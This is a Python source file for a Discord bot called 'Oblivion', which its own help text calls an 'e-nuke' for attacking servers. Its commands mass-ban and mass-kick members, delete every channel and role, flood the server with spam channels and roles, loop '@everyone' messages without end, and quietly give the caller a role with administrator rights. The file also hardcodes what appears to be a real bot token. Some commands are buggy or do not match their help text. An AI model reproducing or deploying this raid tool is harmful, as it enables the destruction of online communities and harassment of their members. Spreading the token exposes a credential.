import discord
from discord.ext import commands 
from discord.ext.commands import Bot
import asyncio
import time
import logging

client = commands.Bot(command_prefix = '.')

client.remove_command("help")

TOKEN = 'NjkzOTIzMDg4NzYwNDM4ODM0.XoFwxg.YjWVR0JbfZhdcWzdfojFmLJ7SlA'

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game('Awaiting FEMA Orders'))
    print(f'\nLogged in as {client.user.name}#{client.user.discriminator}, User ID: {client.user.id}, Version: {discord.__version__}\n')
    print('Oblivion is now online. Awaiting FEMA Orders\nOnly FEMA Director can Activate Systems V9-15\nPending Director Authorization\n\n')

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

@client.command()
async def help(ctx):
    print ('Sending help message...')
    await ctx.send('**INFO ABOUT THE E-NUKE**\nThe e-nuke that FEMA has in development is named Oblivion. If you want to get access to the e-nuke, please contact the director of FEMA. Please note that the bot is not always online. It will only be activated when we need it or we are doing testing.\n**THE E-NUKE COMMANDS**\n`.channel create` - will create 30 spam text and voice channels\n`.channel delete` - will delete 60 channels\n`.role create` - will create 30 spam roles\n`.role delete` - will delete 30 roles\n`.kickAll` - will kick everyone from the server\n`.banAll` - will ban everyone from the server\n`.spam start` - will spam `@everyone` in the chat\n`.spam stop` - will stop the spamming, delete all the channels in the server, then create one channel called general\n`.dab` - will give you admin\n`.override` - will be an emergency stop for the other commands[hopefully -- its still in BETA mode.]\n**FEATURES COMING SOON**\n`.server delete` - will delete the server\n`.nuke` - Will first delete all channels, then create 60 spam channels. Then It will do the same thing to roles. And finally, it will spam `@everyone` in the chat')

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

@client.command()
async def banll(ctx):
    await ctx.message.delete()
    await ctx.send('Banning all members!')
    print('Banning all members...')
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue

@client.command()
async def kickll(ctx):
    await ctx.message.delete()
    await ctx.send('Kicking all members!')
    print('Kicking all members...')
    for member in ctx.guild.members:
        try:
            await member.kick()
        except:
            continue

@client.command(pass_context=True)
async def dab(ctx):
    await ctx.guild.create_role(name='SWAT', permissions=discord.Permissions(8))
    print ('Created SWAT Role')
    role = discord.utils.get(ctx.guild.roles, name='SWAT')
    await ctx.message.author.add_roles(role)
    await ctx.send("Done\nYou're in buddy, now don't mess up")
    print('Gave SWAT Role')

@client.command()
async def role(ctx, choice):
    if choice == 'create':
        print('Spam creating roles...')
        for i in range(1, 31):
            await ctx.guild.create_role(name=f'Spam Role {i}')
        await ctx.send('Done creating spam roles...')
    elif choice == 'delete':
        print('Deleting all roles...')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
        await ctx.send('Done deleting spam roles...')
    else:
        await ctx.send('not valid option')

@client.command()
async def channel(ctx, choice):
    if choice == 'create':
        print('Spam creating channels...')
        for i in range(1, 31):
            await ctx.guild.create_voice_channel(f'Spam-Voice-Channel {i}')
            await ctx.guild.create_text_channel(f'Spam-Text-Channel {i}')
        await ctx.send('Done, I created 60 spam channels')
    elif choice == 'delete':
        print('Deleting all channels...')
        for channel in ctx.guild.channels:
            await channel.delete()
        await ctx.guild.create_text_channel('general')
        await ctx.send('Finsihed deleting all channels')
    else:
        await ctx.send('not valid option')

#starting mod commands  


@client.command(pass_context=True)
async def dm(ctx, message):
    server = ctx.message.server
    for member in server.members:
     await asyncio.sleep(0)
     try:
       await client.send_message(member, '@everyone')
       print("Sent message")
     except:
       pass

@client.command(pass_context=True)
async def kick(ctx, user: discord.Member=None):
    if ctx.message.author.permissions.kick_members:
        if user is None:
            await ctx.send('Please input a user.')
        else:
            await ctx.send (":boot: Get kicked {}, Damn kid".format(user.name))
            await ctx.guild.kick(user)
    else:
        await ctx.send('You lack permission to preform this action')


@client.command(pass_context=True)
async def info(ctx, user: discord.Member=None):
    if user is None:
        await ctx.send('Please input a user.')
    else:
        await ctx.send("The user's name is: {}".format(user.name) + "\nThe user's ID is: {}".format(user.id) + "\nThe user's current status is: {}".format(user.status) + "\nThe user's highest role is: {}".format(user.top_role) + "\nThe user joined at: {}".format(user.joined_at))

client2 = discord.Client()

#continuing nuke commands

@client.command()
async def server(ctx, choice):
        if choice == 'delete':
            server == ctx.message.guild
            print('Deleting Server...')
            await ctx.guild.delete
        elif choice == '':
            ctx.send("Well that didn't work")
        else:
            await ctx.send('not valid option')

import sys 

@client.command()
async def nuke(ctx):
    while 1 == 1:
        channel = 'spam-text-channel-1'
        await ctx.send('@everyone')
    for channel in ctx.guild.channels:
            await channel.delete()
    for i in range(1, 31):
            await ctx.guild.create_voice_channel(f'Spam-Voice-Channel {i}')
            await ctx.guild.create_text_channel(f'Spam-Text-Channel {i}')
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            await role.delete()
    for i in range(1, 31):
            await ctx.guild.create_role(name=f'Spam Role {i}')
    await ctx.guild.create_role(name='SWAT', permissions=discord.Permissions(8))
    role = discord.utils.get(ctx.guild.roles, name='SWAT')
    await ctx.message.author.add_roles(role)
    await ctx.send('Done')



@client.command()
async def spam(ctx, choice): 
        if choice == 'start':
            print ('Sending spam messages...')
            while 1 == 1:
                await ctx.send('@everyone')
        elif choice == 'stop':
            for channel in ctx.guild.channels:
                await channel.delete()
            await ctx.guild.create_text_channel('general')
            await ctx.send('Stopped Spamming...')
        else:
            await ctx.send ('Failed')

@client.command()
async def override(ctx):
    if ctx.author.id == '{client.user.id}': #replace myID with your Discord user ID
        await ctx.send('Attempting...')
        await client.logout()
    else:
        await ctx.send('Attempting')
        await ctx.send('Failed')



def read_token():
    with open('token.txt', 'r') as f:
        return f.readlines()[0].strip()

client.run(TOKEN) 